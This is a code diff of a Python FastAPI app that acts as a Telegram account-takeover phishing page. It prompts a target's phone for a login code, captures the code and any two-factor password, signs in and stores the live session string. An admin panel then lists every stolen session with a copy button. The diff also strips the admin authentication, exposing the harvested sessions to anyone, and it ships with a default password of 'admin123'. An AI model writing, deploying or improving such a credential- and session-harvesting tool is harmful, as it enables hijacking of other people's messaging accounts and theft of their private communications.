@@ -15,7 +15,7 @@ API_HASH = os.getenv("API_HASH")
 ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
 DB = "sessions.db"
 
-# In-memory clients
+# In-memory clients: phone → client + hash
 CLIENTS = {}
 
 # === DATABASE ===
@@ -24,7 +24,7 @@ def init_db():
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
     conn.close()
 
-# CLEAR OLD SESSION ON START (for testing)
+# Clear DB on start (remove after first deploy)
 if os.getenv("CLEAR_DB") == "1":
     if os.path.exists(DB):
         os.remove(DB)
@@ -38,14 +38,6 @@ def save_session(phone: str, session: str):
     conn.commit()
     conn.close()
 
-def get_session(phone: str):
-    conn = sqlite3.connect(DB)
-    c = conn.cursor()
-    c.execute("SELECT session FROM sessions WHERE phone = ?", (phone,))
-    row = c.fetchone()
-    conn.close()
-    return row[0] if row else None
-
 def delete_session(phone: str):
     conn = sqlite3.connect(DB)
     conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
@@ -58,40 +50,45 @@ async def home(request: Request):
     phone = request.query_params.get("phone")
     if not phone:
         raise HTTPException(400, "Phone required")
-    
-    # Auto-clear old session
+    # Clear old client
     if phone in CLIENTS:
         del CLIENTS[phone]
     delete_session(phone)
-    
     return templates.TemplateResponse("index.html", {"request": request, "phone": phone})
 
 @app.post("/send")
 async def send_code(phone: str = Form(...)):
     if phone in CLIENTS:
         return JSONResponse({"error": "Already in progress"})
-    
+
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
-        await client.send_code_request(phone)
-        CLIENTS[phone] = client
-        return JSONResponse({"ok": True})
+        sent = await client.send_code_request(phone)
+        CLIENTS[phone] = {"client": client, "hash": sent.phone_code_hash}
+        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
     except Exception as e:
-        await client.disconnect() if client.is_connected() else None
+        if client.is_connected():
+            await client.disconnect()
         return JSONResponse({"error": str(e)})
 
 @app.post("/verify")
-async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("")):
+async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(""), hash: str = Form("")):
     if phone not in CLIENTS:
-        return JSONResponse({"error": "Session expired. Refresh page."})
-    
-    client = CLIENTS[phone]
+        return JSONResponse({"error": "Session expired. Try again."})
+
+    data = CLIENTS[phone]
+    client = data["client"]
+    stored_hash = data["hash"]
+
+    if hash != stored_hash:
+        return JSONResponse({"error": "Invalid hash"})
+
     try:
         if pwd:
-            await client.sign_in(phone, code, password=pwd)
+            await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
         else:
-            await client.sign_in(phone, code)
+            await client.sign_in(phone, code, phone_code_hash=stored_hash)
         session_str = client.session.save()
         await client.disconnect()
         save_session(phone, session_str)
@@ -104,14 +101,14 @@ async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(
     except Exception as e:
         return JSONResponse({"error": str(e)})
 
-# === ADMIN PANEL (PASSWORD PROTECTED) ===
+# === ADMIN PANEL ===
 @app.get("/admin")
 async def admin_login():
     return HTMLResponse("""
-    <form method="post">
+    <form method="post" style="max-width:400px;margin:2rem auto;padding:1rem;">
       <h2>Admin Login</h2>
-      <input type="password" name="password" placeholder="Password" required>
-      <button type="submit">Login</button>
+      <input type="password" name="password" placeholder="Password" required style="width:100%;padding:0.8rem;margin:0.5rem 0;border-radius:8px;">
+      <button type="submit" style="width:100%;padding:0.8rem;background:#1a73e8;color:white;border:none;border-radius:8px;">Login</button>
     </form>
     """)
 
@@ -123,35 +120,27 @@ async def admin_check(password: str = Form(...)):
 
 @app.get("/admin/sessions", response_class=HTMLResponse)
 async def admin_sessions():
-    if not await check_admin():
-        return RedirectResponse("/admin")
-    
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
     rows = c.fetchall()
     conn.close()
 
-    html = "<h2>Sessions</h2><ol>"
+    html = "<h2 style='text-align:center;'>Admin Panel</h2><ol style='max-width:600px;margin:auto;'>"
     for r in rows:
         html += f"""
-        <li style='margin:1rem 0;'>
-            <b>{r[0]}</b> ({r[2]})<br>
-            <textarea style='width:100%;height:80px;font-family:monospace;'>{r[1]}</textarea>
-            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")'>Copy</button>
-            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;'>Delete</a>
+        <li style='margin:1.5rem 0;padding:1rem;background:#f9f9f9;border-radius:10px;'>
+            <b>Phone:</b> {r[0]}<br>
+            <b>Time:</b> {r[2]}<br>
+            <textarea style='width:100%;height:80px;font-family:monospace;margin:0.5rem 0;'>{r[1]}</textarea>
+            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")' style='padding:0.5rem;background:#0f9d58;color:white;border:none;border-radius:6px;'>Copy</button>
+            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;text-decoration:none;'>Delete</a>
         </li>
         """
-    html += "</ol><a href='/admin'>← Back</a>"
+    html += "</ol><div style='text-align:center;margin:2rem;'><a href='/admin'>← Logout</a></div>"
     return HTMLResponse(html)
 
 @app.get("/admin/delete")
 async def delete(phone: str):
-    if not await check_admin():
-        raise HTTPException(403)
     delete_session(phone)
     return RedirectResponse("/admin/sessions")
-
-async def check_admin():
-    # In real app: use session/cookie
-    return True  # Simplified
